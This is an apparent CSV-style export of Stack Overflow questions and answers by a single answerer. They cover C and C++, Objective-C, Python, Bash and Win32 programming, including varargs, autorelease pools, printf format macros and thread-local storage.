  <p>In this latter case, you cannot return
  the Point by value, since its
  declaration is hidden from users of
  the header file. This is a technique
  used widely in GTK+, for instance.</p>
</blockquote>

<p>How is declaration hiding accomplished? Why can't I return the Point by value?</p>

<p>ADD:</p>

<p>I understood why I can't return the struct by value, but, is still hard to see why i can't deference this point in my function. i.e. If my struct have member named y, why i can't do it?</p>

<pre><code> pointer_to_struct->y = some_value; </code></pre>

<p>Why should I use methods to do it? (Like Gtk+)</p>

<p>Thanks guys, and sorry for my bad english again.</p>
","9530","","<p>As an alternative to using opaque pointers (as others have mentioned), you can instead return an opaque bag of bytes if you want to avoid using heap memory:</p>

<pre><code>// In public.h:
struct Point
{
    uint8_t data[SIZEOF_POINT];  // make sure this size is correct!
};
void MakePoint(struct Point *p);

// In private.h:
struct Point
{
    int x, y, z;
};

void MakePoint(struct Point *p);

// In private.c:
void MakePoint(struct Point *p)
{
    p-&gt;x = 1;
    p-&gt;y = 2;
    p-&gt;z = 3;
}
</code></pre>

<p>Then, you can create instances of the struct on the stack in client code, but the client doesn't know what's in it -- all it knows is that it's a blob of bytes with a given size.  Of course, it can still access the data if it can guess the offsets and data types of the members, but then again you have the same problem with opaque pointers (though clients don't know the object size in that case).</p>

<p>For example, the various structs used in the <code>pthreads</code> library use structs of opaque bytes for types like <code>pthread_t</code>, <code>pthread_cond_t</code>, etc. -- you can still create instances of those on the stack (and you usually do), but you have no idea what's in them.  Just take a peek into your <code>/usr/include/pthreads.h</code> and the various files it includes.</p>
"
"<h3>Original Question:</h3>

<p>I want to generate a Poisson process. If the number of arrivals by time <em>t</em> is <em>N(t)</em> and I have a Poisson distribution with parameter <em>lambda</em> how do I generate <em>N(t)</em>? How would I do this in C++?</p>

<h3>Clarification:</h3>

<p>I originally wanted to generate the process using a Poisson distribution. But, I was confused about what parameter from the process I needed; I thought I could use <em>N(t)</em> but that tells me how many arrivals have occurred on the interval <em>(0,t]</em> which wasn't what I wanted. So, then I thought I could use <em>N(t2)-N(t1)</em> to get the number of arrivals on the interval <em>[t1,t2]</em>. Since <em>N(t)~Poisson(t x lambda)</em> I could use <em>Poisson(t2 x lambda)-Poisson(t1 x lambda)</em> but I don't want the number of arrivals in an interval. </p>

<p>Rather, I want to generate the explicit times that arrivals occur at. </p>

<p>I could do this by making the interval <em>[t2,t1]</em> sufficiently small so that each interval has only one arrival (which occurs as <em>|t2-t1| -> 0</em>). </p>
","9530","","<p>In order to pick a sample from a distribution, you need to compute the inverse cumulative distribution function (CDF).  You first pick a random number uniformly on the real interval [0, 1], and then take the inverse CDF of that value.</p>
"
"<pre><code>FILE *file = fopen([gpsFilePath UTF8String], ""r"");
char c[1024];

while(fgets(c, 1024, file)!=NULL)
{
    NSString *cString = [[NSString alloc] initWithCString:c
                                                 encoding:NSMacOSRomanStringEncoding];

    NSArray *split = [cString componentsSeparatedByString:@"",""];
    if ([split count] != 3)
    {
        continue; //this should only happen on the first line
    }

    gpx = [gpx stringByAppendingString:[NSString stringWithFormat:@""      &lt;trkpt lat=\""%@\"" lon=\""%@\""&gt;&lt;/trkpt&gt;\n\n"", [split objectAtIndex:0], [split objectAtIndex:1]]];
 }
</code></pre>
","9530","","<p>You're allocating several objects for each line of the file, and they aren't getting released because they're getting added to an autorelease pool, and the autorelease pool isn't getting a chance to drain.  Add an autorelease pool that drains every some number of iterations:</p>

<pre><code>NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
FILE *file = fopen([gpsFilePath UTF8String], ""r"");
char c[1024];
int line = 1;
while(fgets(c, 1024, file)!=NULL) {
  NSString *cString = [[NSString alloc] initWithCString:c encoding:NSMacOSRomanStringEncoding];
  NSArray *split = [cString componentsSeparatedByString:@"",""];
  if ([split count] != 3) { continue; }  //this should only happen on the first line
  gpx =  [gpx stringByAppendingString:[NSString stringWithFormat:@""      &lt;trkpt lat=\""%@\"" lon=\""%@\""&gt;&lt;/trkpt&gt;\n\n"",
                                      [split objectAtIndex:0],[split objectAtIndex:1]]];
  if(line % 1000 == 0)  // drain the pool every 1000 iterations
  {
    [pool release];
    pool = [[NSAutoreleasePool alloc] init];
  }
  line++;
 }
[pool release];
</code></pre>
"
"<p>I have seen several questions about exiting a script after a task is successfully completed, but is there a way to do the same for a script which has failed? I am writing a testing script which just checks that a camera is functioning correctly. If the first test fails it is more than likely that the following tests will also fail; therefore, I want the first failure to invoke an exit and provide output to screen letting me know that there was an error.</p>

<p>I hope this is enough information; let me know if more details are required to help me.</p>

<p>Thank you!</p>
","9530","","<p>You can use <a href=""http://docs.python.org/library/sys.html#sys.exit"" rel=""nofollow""><code>sys.exit()</code></a> to exit.  However, if any code higher up catches the <a href=""http://docs.python.org/library/exceptions.html#exceptions.SystemExit"" rel=""nofollow""><code>SystemExit</code></a> exception, it won't exit.</p>
"
"<pre><code>bash-3.2$ sed -i.bakkk -e ""s#/sa/#/he/#g"" .*
sed: .: in-place editing only works for regular files
</code></pre>

<p>I try to replace every /sa/ with /he/ in every dot-file in a folder. How can I get it working?</p>
","9530","","<p>The glob pattern <code>.*</code> includes the special directories <code>.</code> and <code>..</code>, which you probably didn't mean to include in your pattern.  I can't think of an elegant way to exclude them, so here's an inelegant way:</p>

<pre><code>sed -i.bakkk -e ""s$/sa/#/he/#g"" $(ls -d .* | grep -v '^\.\|\.\.$')
</code></pre>
"
"<p>I know I can convert a single file encoding under OSX using:</p>

<p><code>iconv -f ISO-8859-1 -t UTF-8 myfilename.xxx &gt; myfilename-utf8.xxx</code></p>

<p>I have to convert a bunch of files with a specific extension,
so I want to convert file encoding from ISO-8859-1 to UTF-8
for all *.ext files in folder /mydisk/myfolder</p>

<p>perhaps someobe know the syntax how to do this</p>

<p>thanks</p>

<p>ekke</p>
","9530","","<p>If you want to do it recursively, you can use <a href=""http://linux.die.net/man/1/find"" rel=""nofollow""><code>find(1)</code></a>:</p>

<pre><code>find /mydisk/myfolder -name \*.xxx -type f | \
    (while read file; do
        iconv -f ISO-8859-1 -t UTF-8 -i ""$file"" -o ""${file%.xxx}-utf8.xxx
    done)
</code></pre>

<p>Note that I've used <code>| while read</code> instead of the <code>-exec</code> option of find (or piping into <code>xargs</code>) because of the manipulations we need to do with the filename, namely, chopping off the <code>.xxx</code> extension (using <code>${file%.xxx}</code>) and adding <code>-utf8.xxx</code>.</p>
"
"<p>While researching how to do cross-platform <code>printf()</code> format strings in C (that is, taking into account the number of bits I expect each integer argument to <code>printf()</code> should be) I ran across <a href=""http://en.wikipedia.org/wiki/Printf#Format_placeholders"">this section of the Wikipedia article on <code>printf()</code></a>. The article discusses non-standard options that can be passed to <code>printf()</code> format strings, such as (what seems to be a Microsoft-specific extension):</p>

<pre><code>printf(""%I32d\n"", my32bitInt);
</code></pre>

<p>It goes on to state that:</p>

<blockquote>
  <p>ISO C99 includes the inttypes.h header
  file that includes a number of macros
  for use in platform-independent printf
  coding.</p>
</blockquote>

<p>... and then lists a set of macros that can be found in said header. Looking at the header file, to use them I would have to write:</p>

<pre><code> printf(""%""PRId32""\n"", my32bitInt);
</code></pre>

<p>My question is: am I missing something? Is this really the standard C99 way to do it? If so, why? (Though I'm not surprised that I have never seen code that uses the format strings this way, since it seems so cumbersome...)</p>
","9530","","<p>Correct, this is how the C99 standard says you should use them.  If you want truly portablt code that is 100% standards-conformant to the letter, you should always print an <code>int</code> using <code>""%d""</code> and an <code>int32_t</code> using <code>""%""PRId32</code>.</p>

<p>Most people won't bother, though, since there are very few cases where failure to do so would matter.  Unless you're porting your code to Win16 or DOS, you can assume that <code>sizeof(int32_t) &lt;= sizeof(int)</code>, so it's harmless to accidentally printf an <code>int32_t</code> as an <code>int</code>.  Likewise, a <code>long long</code> is pretty much universally 64 bits (although it is not guaranteed to be so), so printing an <code>int64_t</code> as a <code>long long</code> (e.g. with a <code>%llx</code> specifier) is safe as well.</p>

<p>The types <code>int_fast32_t</code>, <code>int_least32_t</code>, et al are hardly ever used, so you can imagine that their corresponding format specifiers are used even more rarely.</p>
"
"<p>I have an designated initializer with optional arguments (similar to the following code), and I want to create an autorelease method by calling it. Is there any way to do this?</p>

<pre><code>@interface MyObject : NSObject

- (id)initWithArgs:(id)firstArg, ...;
+ (id)objectWithArgs:(id)firstArg, ...;

@end

@implementation MyObject

- (id)initWithArgs:(id)firstArg, ...
{
    if (!firstArg || ![super init]) {
    	return nil
    }

    va_list argList;
    va_start(argList, firstArg);

    id currentObject = firstArg;
    do {
    	NSLog(@""%@"", currentObject);
    } while ((currentObject = va_arg(argList, id)) != nil);

    va_end(argList);
    return self;
}

+ (id)objectWithArgs:(id)firstArg, ...
{
    // return [[[MyObject alloc] initWithArgs:firstArg, ...] autorelease];
}

@end
</code></pre>
","9530","","<p>You can't do it.  See the <a href=""http://c-faq.com/varargs/handoff.html"" rel=""nofollow"">comp.lang.c FAQ</a>.  The closest thing you can do is to create two versions of your functions, one which takes varargs (<code>...</code>), and one which takes a <code>va_list</code>.  The varargs version can then pass off the work to the <code>va_list</code> version to avoid duplicate code:</p>

<pre><code>@interface MyObject : NSObject

- (id)initWithArgs:(id)firstArg, ...;
- (id)init:(id)firstArg withVaList:(va_list)args;
+ (id)objectWithArgs:(id)firstArg, ...;
+ (id)object:(id)firstArg withVaList:(va_list)args;

@end

@implementation MyObject

- (id)initWithArgs:(id)firstArg, ...
{
    va_list args;
    va_start(args, firstArg);
    id result = [self init:firstArg withVaList:args];
    va_end(args);
    return result;
}

- (id)init:(id)firstArg withVaList:(va_list)args
{
    // do actual init here:
    while((id arg = va_arg(args, id)))
    {
        // ...
    }
}

+ (id)objectWithArgs:(id)firstArg, ...
{
    va_list args;
    va_start(args, firstArg);
    id result = [MyObject object:firstArg withVaList:args];
    va_end(args);
    return result;
}

+ (id)object:(id)firstArg withVaList:(va_list)args
{
    return [[[MyObject alloc] init:firstArg withVaList:args] autorelease];
}

@end
</code></pre>
"
"<ol>
<li><p>When initializing an NSMutableArray array with object, Why put nil at the end?</p>

<p>e.g.</p>

<pre><code>NSMutableArray *fruits = [[NSMutableArray alloc] initWithObjects:apple,
                                                                 watemelon,
                                                                 nil];
</code></pre></li>
<li><p>In Xcode, when using auto complete for filling out function variables. What's the short cut key to jump to the next variable?</p>

<p>eg:</p>

<pre><code>Fruit *fruit3 = [[Song alloc] initWithName:(NSString *)n
                               description:(NSString *)d
</code></pre>

<p>I'm typing out the <code>initWithName</code> function and it auto completes. So, I press tab right away to get to <code>n</code>, after finishing that, how do i get to <code>d</code>?</p></li>
<li><p>If I have a fruits array with fruit objects as in question 1. Fruit object being an <code>NSObject</code> subclass. Why have the ""copy"" in the <code>@property</code> declaration for name property in my Fruit class.</p>

<p>When I know that by default fruit object will reside in its own memory space. Since I am creating a fruit pointer. <code>Fruit *apple = [[Fruit alloc]....</code></p></li>
<li><p><code>NSString *a = @""Hello Everyone"";</code></p>

<p>What does the <code>@""""</code> do?</p>

<p>Does it do something like this:</p>

<pre><code>[[NSString alloc] initWithValue:""ok""];
</code></pre></li>
</ol>
","9530","","<p>Here's a more complete explanation of question 1.  C and Objective-C are rather much lower-level languages compared to languages such as Java, C#, Python, Ruby, and others.  In C and Objective-C, functions with a variable number of arguments (so-called <em>varargs</em> or <em>variadic</em> functions) are allowed, but the language provides no mechanism for knowing the number of arguments actually passed in.  Higher-level languages usually provide this by exposing the extra arguments as a list or array of objects; C and Objective-C use a more-limited set of macros to access the extra arguments one at a time.</p>

<p>Hence, as a result, any variadic function requires some other method of determining the actual number of parameters passed.  The <a href=""http://linux.die.net/man/3/printf"" rel=""nofollow""><code>printf</code></a> and <a href=""http://linux.die.net/man/3/printf"" rel=""nofollow""><code>scanf</code></a> families of functions and their ilk use a format string as one of the fixed parameters, and the format specifiers found in the format string indicate the number and types of extra arguments passed in.  The <code>-initWithObjects:</code> message of the Objective-C class <code>NSMutableArray</code>, on the other hand, requires the list of extra arguments to be terminated with <code>nil</code>.  As a consequence, you can't pass in <code>nil</code> as an argument (since it would mark the end of the arguments list), but that's ok in this case since <code>NSMutableArray</code>s specify that they cannot contain <code>nil</code> objets.</p>

<p>On the x86 architecture, variadic functions are implemented using the C calling convention (cdecl), whereby the arguments are pushed on the stack from right-to-left.  The caller is responsible for cleaning up the stack after the call.  So, a call to <code>printf()</code> might get compiled into something like this:</p>

<pre><code>// ignore the fact that these are invalid calls to printf
printf(""format string 1"", a1, a2);
printf(""format string 2"", b1, b2, b3);

// The above might get compiled into this:
push a2
push a2
push &lt;address of ""format string 1""&gt;
call printf
add $12. %esp    // restore stack pointer to offset the pushes
push b3
push b2
push b1
push &lt;address of ""format string 2""&gt;
call printf
add $16, %esp   // restore stack pointer
</code></pre>

<p>The reason the arguments are pushed right-to-left instead of left-to-right is that the stack grows <em>downwards</em> -- the x86 <code>push</code> instruction decrements the stack pointer <code>esp</code> by 4 bytes.  So, when the called function examines the stack, it will see the arguments in the proper order.  Immediately after the first call to <code>printf</code> above, the stack looks like this:</p>

<pre>
%esp+0x00: return address to calling function
%esp+0x04: address of ""format string 1"">
%esp+0x08: a1
%esp+0x0c: a2
%esp+0x10 and above: local variables from calling function, rest of stack
</pre>

<p>When the called function examines its arguments, it just walks the stack, but it doesn't know where to stop -- the calling convention doesn't specify how many arguments there are.  The function just has to know by some other means.  Most functions have a fixed number of parameters, so that's easy for them, but variadic functions need some other way of determining the exact number of parameters.</p>

<p>If there's a mismatch between how many parameters the function thinks it was passed and how many were actually passed (e.g. a bad format string was passed to <code>printf</code>), then badness will result.  The most likely case is that the function will keep reading down the stack, and you'll get garbage values somewhere.  Worse, your program might crash.  Even worse, your program might appear to work normally, but you may have inadvertantly opened up a security hole.</p>
"
"<p>Does anybody know how I can programmatically check (using C#) whether my program will be able to read / write a particular registry key (specifically: ""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"")?</p>

<p>I am asking because my program has the option to enable or disable the 'run at startup' behaviour. I want to disable this option if the current user is not allowed to make changes to the registry. Is this key always allowed to be written by the current user, or is there the possibility that it has been locked down? If the latter, how do I check this?</p>

<p>I have seen several conflicting ways of checking registry permissions - but basically I can't find a way to check a specific key before I try to read it. I would rather perform the check before accessing the key than trying to access it and receive an exception.</p>

<p>Any help is much appreciated.</p>

<p>Tom</p>
","9530","","<p>I'm not sure how to it with C#, but with Win32, you would use <a href=""http://msdn.microsoft.com/en-us/library/aa379313%28VS.85%29.aspx"" rel=""nofollow""><code>RegGetKeySecurity()</code></a>.  Maybe there's a C# wrapper?  Otherwise, use P/Invoke.</p>
"
"<p>What's the best way to represent a 128-bit number in C++? It should behave as closely to the built-in numeric types as possible (i.e. support all the arithmetic operators, etc).</p>

<p>I was thinking of building a class that had 2 64 bit or 4 32 bit numbers. Or possibly just creating a 128 bit block of memory and doing everything myself.</p>

<p>Is there some easier/more standard way, or something that I'm less likely to screw up when implementing it myself? :)</p>

<p>It would also be nice if it could be extended to 256-bit, 512-bit, etc...</p>
","9530","","<p>Don't reinvent the wheel -- I'm positive other people have already solved this problem, although I can't name any solutions off the top of my head.  <a href=""http://gmplib.org/"" rel=""nofollow"">GMP</a> can surely solve your problem, although it's overkill for fixed-size integers, and it's also a little cumbersome to use (it's a C library, not C++).</p>
"
"<p>I read in a lot of books the claim that ""<strong>C is a subset of C++</strong>"".<br />
Actually some (good?) books say: ""C is a subset of C++ <strong>except the little Details</strong>"".</p>

<p>I am interested what these details are.  I've never seen one.</p>
","9530","","<p>A full detailed list, with citations to the various C and C++ standards, can be found here: <a href=""http://david.tribble.com/text/cdiffs.htm"">Incompatibilities between ISO C and ISO C++</a>.</p>
"
"<p>In Windows, is there a way to check for the existence of an environment variable for another process?  Just need to check existence, not necessarily get value.</p>

<p>I need to do this from code.</p>
","9530","","<p>If you know the virtual address at which the environment is stored, you can use <a href=""http://msdn.microsoft.com/en-us/library/ms684320%28VS.85%29.aspx""><code>OpenProcess</code></a> and <a href=""http://msdn.microsoft.com/en-us/library/ms680553%28VS.85%29.aspx""><code>ReadProcessMemory</code></a> to read the environment out of the other process.  However, to find the virtual address, you'll need to poke around in the <a href=""http://en.wikipedia.org/wiki/Win32%5FThread%5FInformation%5FBlock"">Thread Information Block</a> of one of the process' threads.</p>

<p>To get that, you'll need to call <a href=""http://msdn.microsoft.com/en-us/library/ms679362%28VS.85%29.aspx""><code>GetThreadContext()</code></a> after calling <a href=""http://msdn.microsoft.com/en-us/library/ms686345%28VS.85%29.aspx""><code>SuspendThread()</code></a>.  But in order to call those, you need a thread handle, which you can get by calling <a href=""http://msdn.microsoft.com/en-us/library/ms682489%28VS.85%29.aspx""><code>CreateToolhelp32Snapshot</code></a> with the <code>TH32CS_SNAPTHREAD</code> flag to create a snapshot of the process, <a href=""http://msdn.microsoft.com/en-us/library/ms686728%28VS.85%29.aspx""><code>Thread32First</code></a> to get the thread ID of the first thread in the process, and <a href=""http://msdn.microsoft.com/en-us/library/ms684335%28VS.85%29.aspx""><code>OpenThread</code></a> to get a handle to the thread.</p>
"
"<p>I'm trying to create a Bash script that will extract the last parameter given from the command line into a variable to be used elsewhere.  Here's the script I'm working on:</p>

<pre><code>#!/bin/bash
# compact - archive and compact file/folder(s)

eval LAST=\$$#

FILES=""$@""
NAME=$LAST

# Usage - display usage if no parameters are given
if [[ -z $NAME ]]; then
  echo ""compact &lt;file&gt; &lt;folder&gt;... &lt;compressed-name&gt;.tar.gz""
  exit
fi

# Check if an archive name has been given
if [[ -f $NAME ]]; then
  echo ""File exists or you forgot to enter a filename.  Exiting.""
  exit
fi

tar -czvpf ""$NAME"".tar.gz $FILES
</code></pre>

<p>Since the first parameters could be of any number, I have to find a way to extract the last parameter, (e.g. compact file.a file.b file.d files-a-b-d.tar.gz).  As it is now the archive name will be included in the files to compact.  Is there a way to do this?</p>
","9530","","<p>Several solutions have already been posted; however I would advise restructuring your script so that the archive name is the <em>first</em> parameter rather than the last.  Then it's really simple, since you can use the <a href=""http://www.gnu.org/software/bash/manual/html%5Fnode/Bourne-Shell-Builtins.html#index-shift-121""><code>shift</code> builtin</a> to remove the first parameter:</p>

<pre><code>ARCHIVENAME=""$1""
shift
# Now ""$@"" contains all of the arguments except for the first
</code></pre>
"
"<p>Any ideas on how to make a BSTR out of an LPCOLESTR? Silly thing to get hung up on..</p>
","9530","","<p>An <code>LPCOLESTR</code> is just a <code>const wchar_t*</code>, so you can use <a href=""http://msdn.microsoft.com/en-us/library/ms221458.aspx"" rel=""nofollow""><code>SysAllocString()</code></a> to create a <code>BSTR</code>:</p>

<pre><code>LPCOLESTR olestr = ...;
BSTR bstr = SysAllocString(olestr);
</code></pre>

<p>Be sure to call <a href=""http://msdn.microsoft.com/en-us/library/ms221481.aspx"" rel=""nofollow""><code>SysFreeString()</code></a> when you're done with your <code>BSTR</code>.  See also the <a href=""http://msdn.microsoft.com/en-us/library/ms221069.aspx"" rel=""nofollow"">MSDN documentation on <code>BSTR</code>s</a></p>
"
"<p><strong>Purpose</strong></p>

<p>I'm writing a small library for which portability is the biggest concern. It has been designed to assume only a mostly-compliant C90 (ISO/IEC 9899:1990) environment... nothing more. The set of functions provided by the library all operate (read/write) on an internal data structure. I've considered some other design alternatives, but nothing else seems feasible for what the library is <a href=""http://stackoverflow.com/questions/989383/what-portability-issues-are-associated-with-byte-level-access-to-pointers-in-c"" rel=""nofollow"" title=""What portability issues are associated with byte-level access to pointers in C?"">trying to achieve</a>.</p>

<p><strong>Question</strong></p>

<p>Are there any portable algorithms, techniques, or incantations which can be used to ensure thread-safety? I am not concerned with making the functions re-entrant. Moreover, I am not concerned with speed or (possibly) wasting resources if the algorithm/technique/incantation is portable. Ideally, I don't want to depend on any libraries (such as GNU Pth) or system-specific operations (like atomic test-and-set).</p>

<p>I have considered modifying <a href=""http://en.wikipedia.org/wiki/Lamport%27s%5Fbakery%5Falgorithm"" rel=""nofollow"">Lamport's bakery algorithm</a>, but I do not know how to alter it to work inside of the functions called by the threads instead of working in the threads themselves.</p>

<p>Any help is greatly appreciated.</p>
","9530","","<p>Lamport's bakery algorithm would probably work; unfortunately, there are still practical problems with it.  Specifically, many CPUs implement <a href=""http://en.wikipedia.org/wiki/Out-of-order%5Fexecution"" rel=""nofollow"">out-of-order memory operations</a>: even if you've compiled your code into a perfectly correct instruction sequence, the CPU, when executing your code, may decide to reorder the instructions on the fly to achieve better performance.  The only way to get around this is to use <a href=""http://en.wikipedia.org/wiki/Memory%5Fbarrier"" rel=""nofollow"">memory barriers</a>, which are highly system- and CPU-specific.</p>

<p>You really only have two choices here: either (1) keep your library thread-unsafe and make your users aware of that in the documentation, or (2) use a platform-specific mutex.  Option 2 can be made easier by using another library that implements mutexes for a large variety of platforms and provides you with a unified, abstract interface.</p>
"
"<p>I have a makefile, and a snippet looks like this (files and targets renamed for clarity):</p>

<pre>
target1 : OtherLib.o MyProg.h MyProg.cpp
    g++ -c ./MyProg.cpp -o $(BUILD_DIR)/MyProg.o
</pre>

<p>When I run 'make target1', I want make to check to see that MyProg.h and MyProg.cpp are up to date and run target1 if not. However, I am getting the error </p>

<pre>
make: *** No rule to make target `MyProg.cpp', needed by `target1'. Stop.
</pre>

<p>But 'MyProg.cpp' is what I'm trying to compile! So, I made an empty target for it, like this:</p>

<pre>
MyProg.h :
MyProg.cpp :
target1 : OtherLib.o MyProg.h MyProg.cpp
    g++ -c ./MyProg.cpp -o $(BUILD_DIR)/MyProg.o
</pre>

<p>This works, but it seems weird. I am under the impression that if I do simply this:</p>

<pre>
target1 : OtherLib.o
    g++ -c ./MyProg.cpp -o $(BUILD_DIR)/MyProg.o
</pre>

<p>then MyProg will be compiled regardless of whether or not it is up to date, because MyProg.cpp is not listed as a dependency. What is the right way to do this so that make will compile MyProg.o only if MyProg.cpp and MyProg.h are not up to date?</p>
","9530","","<p>I'm not able to reproduce your problem.  You can try running make with the <code>-d</code> option to get a very detailed history of what make is trying to do.  My best guess is that it's looking in the wrong directory for some reason.</p>
"
"<p>I'm trying to optimize 'in the small' on a project of mine.</p>

<p>There's a series of array accesses that are individually tiny, but profiling has revealed that these array accesses are where the vast majority of my program is spending its time.  So, time to make things faster, since the program takes about an hour to run.</p>

<p>I've moved the following type of access:</p>

<pre><code>const float theValOld1 = image(x, y, z);
const float theValOld2 = image(x, y+1, z);
const float theValOld3 = image(x, y-1, z);
const float theValOld4 = image(x-1, y, z);
</code></pre>

<p>etc, for 28 accesses around the current pixel.</p>

<p>where image thunks down to </p>

<pre><code>float image(const int x, const int y, const int z) const {
     return data[z*xsize*ysize + y*xsize + x];
}
</code></pre>

<p>and I've replaced it with</p>

<pre><code>const int yindex = y*xsize;
const int zindex = z*xsize*ysize;
const float* thePtr = &amp;(data[z*xsize*ysize + y*xsize + x]);
const float theVal1 = *(thePtr);
const float theVal2 = *(thePtr + yindex);
const float theVal3 = *(thePtr - yindex);
const float theVal4 = *(thePtr - 1);
</code></pre>

<p>etc, for the same number of operations.</p>

<p>I would expect that, if the compiler were totally awesome, that this change would do nothing to the speed.  If the compiler is not awesome, then I'd say that the second version should be faster, if only because I'm avoiding the implict pointer addition that comes with the [] thunk, as well as removing the multiplications for the y and z indeces.</p>

<p>To make it even more lopsided, I've moved the z operations into their own section that only gets hit if zindex != 0, so effectively, the second version only has 9 accesses.  So by that metric, the second version should definitely be faster.</p>

<p>To measure performance, I'm using QueryPerformanceCounter.</p>

<p>What's odd to me is that the order of operations matters!</p>

<p>If I leave the operations as described and compare the timings (as well as the results, to make sure that the same value is calculated after optimization), then the older code takes about 45 ticks per pixel and the new code takes 10 ticks per pixel.  If I reverse the operations, then the old code takes about 14 ticks per pixel and the new code takes about 30 ticks per pixel (with lots of noise in there, these are averages over about 100 pixels).</p>

<p>Why should the order matter?  Is there caching or something happening?  The variables are all named different things, so I wouldn't think that would matter.  If there is some caching happening, is there any way I can take advantage of it from pixel to pixel?</p>

<p>Corollary: To compare speed, I'm supposing that the right way is to run the two versions independently of one another, and then compare the results from different runs.  I'd like to have the two comparisons next to each other make sense, but there's obviously something happening here that prevents that.  Is there a way to salvage this side-by-side run to get a reasonable speed comparison from a single run, so I can make sure that the results are identical as well (easily)?</p>

<p>EDIT: To clarify.</p>

<p>I have both new and old code in the same function, so I can make sure that the results are identical.</p>

<p>If I run old code and then new code, new code runs faster than old.
If I run new code and then old code, old code runs faster than new.</p>

<p>The z hit is required by the math, and the if statement cannot be removed, and is present in both.  For the new code, I've just moved more z-specific code into the z section, and the test code I'm using is 100% 2D.  When I move to 3D testing, then I'm sure I'll see more of the effect of branching.</p>
","9530","","<blockquote>
  <p>To make it even more lopsided, I've moved the z operations into their own section that only gets hit if zindex != 0, so effectively, the second version only has 9 accesses. So by that metric, the second version should definitely be faster.</p>
</blockquote>

<p>Did you actually measure that?  Because I'd be pretty surprised if that were true.  An <code>if</code> statement in the inner loop of your program can add a surprising amount of overhead -- see <a href=""http://stackoverflow.com/questions/315306/is-if-expensive"">Is ""IF"" expensive?</a>.  I'd be willing to bet that the overhead of the extra multiply is a lot less than the overhead of the branching, unless <code>z</code> happens to be zero 99% of the time.</p>

<blockquote>
  <p>What's odd to me is that the order of operations matters!</p>
</blockquote>

<p>The order of what operations?  It's not clear to me what you're reordering here.  Please give some more snippets of what you're trying to do.</p>
"
"<p>I'm going to be working with a C++ library written in plain C++ (not .NET and without MFC).  The library is available compiled using both Visual Studio 2005 / Intel Fortran 9.1 and VS 2008 / Intel Fortran 10.1.</p>

<p>Obviously I'm going to grab the binaries for VS 2008 since that's the environment on my computer but I'm curious if there are reasons why a straight C++ library wouldn't be compatible between VS 2005 and 2008.  I'd assume that the name-mangling would be the same but maybe there are other reasons.  I haven't used C++ in a long time so I'm a little rusty when it comes to these things.</p>
","9530","","<p>It should probably work.  The DLL compiled with VS 2005 will be dependent on VS 2005's implementation of the C standard library (<code>msvcr80.dll</code>), whereas your code will depend on VS 2008's C library (<code>msvcr90.dll</code>).  This means that at runtime, both versions of the C libraries will be loaded, which is ok, but it increases your memory usage and slows down your load time by a very small amount.</p>
"
"<p>Lots of editors and IDEs have code completion. Some of them are very ""intelligent"" others are not really. I am interested in the more intelligent type. For example I have seen IDEs that only offer a function if it is a) available in the current scope b) its return value is valid. (For example after ""5 + foo[tab]"" it only offers functions that return something that can be added to an integer or variable names of the correct type.) I have also seen that they place the more often used or longest option ahead of the list.</p>

<p>I realize you need to parse the code. But usually while editing the current code is invalid there are syntax errors in it. How do you parse something when it is incomplete and contains errors?</p>

<p>There is also a time constraint. The completion is useless if it takes seconds to come up with a list. Sometimes the completion algorithm deals with thousands of classes.</p>

<p>What are the good algorithms and data structures for this?</p>
","9530","","<p>I can't say exactly what algorithms are used by any particular implementation, but I can make some educated guesses.  A <a href=""http://en.wikipedia.org/wiki/Trie"">trie</a> is a very useful data structure for this problem: the IDE can maintain a large trie in memory of all of the symbols in your project, with some extra metadata at each node.</p>

<p>When you type a character, it walks down a path in the trie.  All of the descendants of a particular trie node are possible completions.  The IDE then just needs to filter those out by the ones that make sense in the current context, but it only needs to compute as many as can be displayed in the tab-completion pop-up window.</p>

<p>More advanced tab-completion requires a more complicated trie.  For example, <a href=""http://www.wholetomato.com/"">Visual Assist X</a> has a feature whereby you only need to type the capital letters of CamelCase symbols -- e.g., if you type SFN, it shows you the symbol <code>SomeFunctionName</code> in its tab-completion window.</p>

<p>Computing the trie (or other data structures) does require parsing all of your code to get a list of all of the symbols in your project.  Visual Studio stores this in its IntelliSense database, an <code>.ncb</code> file stored alongside your project, so that it doesn't have to reparse everything every time you close and reopen your project.  The first time you open a large project (say, one you just synced form source control), VS will take the time to parse everything and generate the database.</p>

<p>I don't know how it handles incremental changes.  As you said, when you're writing code, it's invalid syntax 90% of the time, and reparsing everything whenever you idled would put a huge tax on your CPU for very little benefit, especially if you're modifying a header file included by a large number of source files.</p>

<p>I suspect that it either (a) only reparses whenever you actually build your project (or possibly when you close/open it), or (b) it does some sort of local parsing where it only parses the code around where you've just edited in some limited fashion, just to get the names of the relevant symbols.  Since C++ has such an outstandingly complicated grammar, it may behave oddly in the dark corners if you're using heavy template metaprogramming and the like.</p>
"
"<p>How can I grep for a certain string recursively in all .htaccess files?</p>

<pre><code>grep -r -n -H -I 'string' .htaccess
</code></pre>

<p>doesn't seem to work.</p>

<p>I'm on a GNU Linux system.</p>
","9530","","<p>Use the <code>--include</code> option:</p>

<pre><code>grep -rnHI 'pattern' --include=.htaccess .
</code></pre>
"
"<p>I have a string of this form</p>

<pre><code>s='arbit'
string='%s hello world %s hello world %s' %(s,s,s)
</code></pre>

<p>All the %s in string have the same value (i.e. s).
Is there a better way of writing this? (Rather than listing out s three times)</p>
","9530","","<p>You can use <a href=""http://www.python.org/dev/peps/pep-3101/"">advanced string formatting</a>, available in Python 2.6 and Python 3.x:</p>

<pre><code>incoming = 'arbit'
result = '{0} hello world {0} hello world {0}'.format(incoming)
</code></pre>
"
"<p>Starting with pthreads, I cannot understand what is the business with pthread_key_t  and pthread_once_t?</p>

<p>Would someone explain in simple terms with examples, if possible?</p>

<p>thanks</p>
","9530","","<p><code>pthread_key_t</code> is for creating thread <a href=""http://en.wikipedia.org/wiki/Thread-local_storage"" rel=""nofollow"">thread-local storage</a>: each thread gets its own copy of a data variable, instead of all threads sharing a global (or function-static, class-static) variable.  The TLS is indexed by a key.  See <a href=""https://computing.llnl.gov/tutorials/pthreads/man/pthread_getspecific.txt"" rel=""nofollow""><code>pthread_getspecific</code></a> et al for more details.</p>

